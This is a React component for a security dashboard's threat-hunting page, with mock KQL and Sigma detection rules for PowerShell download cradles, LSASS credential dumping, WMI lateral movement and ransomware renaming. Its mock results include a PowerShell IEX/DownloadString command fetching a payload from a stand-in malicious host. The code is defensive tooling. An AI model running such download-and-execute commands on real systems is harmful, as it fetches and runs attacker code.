'use client';

import { useState } from 'react';
import { clsx } from 'clsx';
import { format } from 'date-fns';

// ─── Types ────────────────────────────────────────────────────────────────────

interface HuntQuery {
  id: string;
  name: string;
  query: string;
  language: 'yara' | 'sigma' | 'kql' | 'sql';
  description: string;
  mitreTactic?: string;
  mitreTechnique?: string;
  author: string;
  lastRun?: string;
  hitCount?: number;
}

interface HuntResult {
  id: string;
  timestamp: string;
  source: string;
  hostname: string;
  user?: string;
  data: Record<string, string>;
  severity: 'critical' | 'high' | 'medium' | 'low';
}

// ─── Mock Data ────────────────────────────────────────────────────────────────

const SAVED_QUERIES: HuntQuery[] = [
  {
    id: 'q-001',
    name: 'Suspicious PowerShell Execution',
    query: `process where process.name == "powershell.exe" and
  (process.command_line like~ "*-encoded*" or
   process.command_line like~ "*-bypass*" or
   process.command_line like~ "*IEX*" or
   process.command_line like~ "*DownloadString*")`,
    language: 'kql',
    description: 'Detect obfuscated or download-based PowerShell execution',
    mitreTactic: 'Execution',
    mitreTechnique: 'T1059.001',
    author: 'SOC Team',
    lastRun: new Date(Date.now() - 3600000).toISOString(),
    hitCount: 7,
  },
  {
    id: 'q-002',
    name: 'LSASS Memory Dump',
    query: `process where process.name in ("procdump.exe", "procdump64.exe", "lsass.exe") and
  process.command_line like~ "*lsass*"
| union
  file where file.path like~ "*\\\\lsass.dmp"`,
    language: 'kql',
    description: 'Detect potential credential dumping from LSASS',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'T1003.001',
    author: 'Red Team',
    lastRun: new Date(Date.now() - 86400000).toISOString(),
    hitCount: 1,
  },
  {
    id: 'q-003',
    name: 'Lateral Movement via WMI',
    query: `process where process.parent.name == "WmiPrvSE.exe" and
  process.name not in ("WmiPrvSE.exe", "msiexec.exe") and
  network.destination.port in (445, 135, 139)`,
    language: 'kql',
    description: 'Detect WMI-based lateral movement to remote systems',
    mitreTactic: 'Lateral Movement',
    mitreTechnique: 'T1021.006',
    author: 'SOC Team',
    lastRun: undefined,
    hitCount: undefined,
  },
  {
    id: 'q-004',
    name: 'Ransomware File Extension Changes',
    query: `title: Ransomware File Extension Modification
status: experimental
description: Detects file extension mass renaming indicating ransomware
logsource:
  category: file_event
detection:
  selection:
    TargetFilename|endswith:
      - '.encrypted'
      - '.locked'
      - '.crypted'
      - '.ryk'
  condition: selection | count() by Image > 20
falsepositives:
  - Legitimate backup software
level: high`,
    language: 'sigma',
    description: 'Detect mass file renaming typical of ransomware activity',
    mitreTactic: 'Impact',
    mitreTechnique: 'T1486',
    author: 'CISA Feed',
    lastRun: new Date(Date.now() - 7200000).toISOString(),
    hitCount: 0,
  },
];

const MOCK_RESULTS: HuntResult[] = [
  {
    id: 'r-001',
    timestamp: new Date(Date.now() - 1800000).toISOString(),
    source: 'CrowdStrike',
    hostname: 'WORKSTATION-042',
    user: 'john.doe',
    data: {
      'process.name': 'powershell.exe',
      'process.command_line': 'powershell.exe -Bypass -EncodedCommand JABX...',
      'process.parent.name': 'excel.exe',
    },
    severity: 'high',
  },
  {
    id: 'r-002',
    timestamp: new Date(Date.now() - 3600000).toISOString(),
    source: 'CrowdStrike',
    hostname: 'SERVER-DC01',
    user: 'svc_admin',
    data: {
      'process.name': 'powershell.exe',
      'process.command_line': "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
      'network.destination.ip': '185.220.101.45',
    },
    severity: 'critical',
  },
];

// ─── Language badge ───────────────────────────────────────────────────────────

const LANG_CONFIG: Record<string, { label: string; color: string }> = {
  kql: { label: 'KQL', color: 'text-blue-400 bg-blue-500/10 border-blue-500/20' },
  sigma: { label: 'Sigma', color: 'text-purple-400 bg-purple-500/10 border-purple-500/20' },
  yara: { label: 'YARA', color: 'text-yellow-400 bg-yellow-500/10 border-yellow-500/20' },
  sql: { label: 'SQL', color: 'text-green-400 bg-green-500/10 border-green-500/20' },
};

// ─── Main View ────────────────────────────────────────────────────────────────

export function HuntView() {
  const [selectedQuery, setSelectedQuery] = useState<HuntQuery | null>(SAVED_QUERIES[0]);
  const [activeTab, setActiveTab] = useState<'saved' | 'new'>('saved');
  const [customQuery, setCustomQuery] = useState('');
  const [selectedLang, setSelectedLang] = useState<HuntQuery['language']>('kql');
  const [results, setResults] = useState<HuntResult[] | null>(null);
  const [isRunning, setIsRunning] = useState(false);

  const handleRun = async () => {
    setIsRunning(true);
    setResults(null);
    await new Promise(r => setTimeout(r, 1500));
    setResults(selectedQuery?.id === 'q-001' ? MOCK_RESULTS : []);
    setIsRunning(false);
  };

  const SEVERITY_COLORS: Record<string, string> = {
    critical: 'text-red-400',
    high: 'text-orange-400',
    medium: 'text-yellow-400',
    low: 'text-blue-400',
  };

  return (
    <div className="space-y-5">
      {/* Header */}
      <div>
        <h1 className="text-xl font-semibold text-gray-100">Threat Hunting</h1>
        <p className="text-sm text-gray-500 mt-0.5">
          Proactive hunt across your environment with KQL, Sigma, and YARA
        </p>
      </div>

      <div className="grid grid-cols-12 gap-5">
        {/* Left: Query Sidebar */}
        <div className="col-span-4 space-y-3">
          <div className="bg-gray-900/60 border border-gray-800/60 rounded-xl overflow-hidden">
            <div className="flex border-b border-gray-800/60">
              {(['saved', 'new'] as const).map((t) => (
                <button
                  key={t}
                  onClick={() => setActiveTab(t)}
                  className={clsx(
                    'flex-1 text-xs py-2.5 transition-colors',
                    activeTab === t ? 'text-blue-400 bg-blue-500/5' : 'text-gray-500 hover:text-gray-300'
                  )}
                >
                  {t === 'saved' ? 'Saved Queries' : 'New Query'}
                </button>
              ))}
            </div>

            {activeTab === 'saved' && (
              <div className="divide-y divide-gray-800/60">
                {SAVED_QUERIES.map((q) => {
                  const langCfg = LANG_CONFIG[q.language];
                  return (
                    <button
                      key={q.id}
                      onClick={() => setSelectedQuery(q)}
                      className={clsx(
                        'w-full text-left px-3 py-3 hover:bg-gray-800/30 transition-colors',
                        selectedQuery?.id === q.id ? 'bg-blue-500/5 border-l-2 border-l-blue-500' : ''
                      )}
                    >
                      <div className="flex items-center gap-2 mb-1">
                        <span className={clsx('text-xs px-1.5 py-0.5 rounded border', langCfg.color)}>
                          {langCfg.label}
                        </span>
                        {q.hitCount !== undefined && q.hitCount > 0 && (
                          <span className="text-xs bg-red-500/20 text-red-400 px-1.5 py-0.5 rounded">
                            {q.hitCount} hits
                          </span>
                        )}
                      </div>
                      <p className="text-sm text-gray-300 truncate">{q.name}</p>
                      {q.mitreTechnique && (
                        <p className="text-xs text-gray-600 mt-0.5">{q.mitreTechnique} · {q.mitreTactic}</p>
                      )}
                    </button>
                  );
                })}
              </div>
            )}

            {activeTab === 'new' && (
              <div className="p-3 space-y-2">
                <select
                  value={selectedLang}
                  onChange={(e) => setSelectedLang(e.target.value as HuntQuery['language'])}
                  className="w-full bg-gray-800 border border-gray-700 rounded-lg text-sm text-gray-300 px-2 py-1.5 focus:outline-none"
                >
                  {Object.entries(LANG_CONFIG).map(([k, v]) => (
                    <option key={k} value={k}>{v.label}</option>
                  ))}
                </select>
                <textarea
                  value={customQuery}
                  onChange={(e) => setCustomQuery(e.target.value)}
                  placeholder="Enter your hunt query…"
                  rows={8}
                  className="w-full bg-gray-800 border border-gray-700 rounded-lg text-xs font-mono text-gray-300 placeholder-gray-600 px-3 py-2 focus:outline-none focus:border-blue-500/50 resize-none"
                />
              </div>
            )}
          </div>
        </div>

        {/* Right: Query Editor + Results */}
        <div className="col-span-8 space-y-4">
          {selectedQuery && (
            <div className="bg-gray-900/60 border border-gray-800/60 rounded-xl overflow-hidden">
              <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800/60">
                <div>
                  <h3 className="text-sm font-medium text-gray-200">{selectedQuery.name}</h3>
                  <p className="text-xs text-gray-500 mt-0.5">{selectedQuery.description}</p>
                </div>
                <button
                  onClick={handleRun}
                  disabled={isRunning}
                  className="bg-green-600 hover:bg-green-500 disabled:opacity-50 text-white text-sm px-4 py-1.5 rounded-lg transition-colors flex items-center gap-2"
                >
                  {isRunning ? (
                    <>
                      <div className="w-3 h-3 border border-white border-t-transparent rounded-full animate-spin" />
                      Running…
                    </>
                  ) : (
                    <>▶ Run Hunt</>
                  )}
                </button>
              </div>

              <div className="p-4">
                <pre className="text-xs font-mono text-gray-400 bg-gray-950/60 rounded-lg p-3 overflow-x-auto whitespace-pre-wrap">
                  {selectedQuery.query}
                </pre>
              </div>

              {selectedQuery.mitreTechnique && (
                <div className="px-4 pb-3 flex items-center gap-2">
                  <span className="text-xs text-gray-500">MITRE ATT&CK:</span>
                  <span className="text-xs bg-orange-500/10 text-orange-400 border border-orange-500/20 px-2 py-0.5 rounded">
                    {selectedQuery.mitreTechnique}
                  </span>
                  <span className="text-xs text-gray-500">·</span>
                  <span className="text-xs text-gray-400">{selectedQuery.mitreTactic}</span>
                  <span className="text-xs text-gray-600 ml-auto">By {selectedQuery.author}</span>
                </div>
              )}
            </div>
          )}

          {/* Results */}
          {results !== null && (
            <div className="bg-gray-900/60 border border-gray-800/60 rounded-xl overflow-hidden">
              <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800/60">
                <h3 className="text-sm font-medium text-gray-300">
                  Hunt Results
                  <span className={clsx('ml-2', results.length > 0 ? 'text-red-400' : 'text-green-400')}>
                    ({results.length} {results.length === 1 ? 'match' : 'matches'})
                  </span>
                </h3>
              </div>

              {results.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-24 text-green-400/70">
                  <span className="text-xl mb-1">✓</span>
                  <p className="text-sm">No threats found</p>
                </div>
              ) : (
                <div className="divide-y divide-gray-800/60">
                  {results.map((r) => (
                    <div key={r.id} className="p-4">
                      <div className="flex items-center gap-3 mb-2">
                        <span className={clsx('text-xs font-medium', SEVERITY_COLORS[r.severity])}>
                          {r.severity.toUpperCase()}
                        </span>
                        <span className="text-xs text-gray-400">{r.hostname}</span>
                        {r.user && <span className="text-xs text-gray-500">@{r.user}</span>}
                        <span className="text-xs text-gray-600 ml-auto">
                          {format(new Date(r.timestamp), 'MMM dd HH:mm:ss')}
                        </span>
                        <span className="text-xs bg-gray-800 text-gray-500 px-1.5 py-0.5 rounded">{r.source}</span>
                      </div>
                      <div className="bg-gray-950/60 rounded-lg p-2 space-y-1">
                        {Object.entries(r.data).map(([k, v]) => (
                          <div key={k} className="flex gap-2 text-xs font-mono">
                            <span className="text-blue-400 shrink-0">{k}:</span>
                            <span className="text-gray-400 truncate">{v}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
